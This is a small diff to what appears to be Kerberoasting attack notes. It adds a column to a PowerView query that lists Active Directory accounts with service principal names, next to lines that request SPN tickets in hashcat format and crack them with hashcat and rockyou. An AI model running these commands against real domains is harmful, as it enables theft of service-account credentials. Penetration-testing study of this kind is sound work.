@@ -108,7 +108,7 @@ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 #### Using PowerView to Enumerate SPN Accounts
 ```powershell
 Import-Module .\PowerView.ps1
-Get-DomainUser * -spn | select samaccountname # list all users with SPNs
+Get-DomainUser * -spn | select samaccountname,serviceprincipalname # list all users with SPNs
 
 # Using PowerView to Target a Specific User
 Get-DomainUser -Identity <USER-SVC> | Get-DomainSPNTicket -Format Hashcat
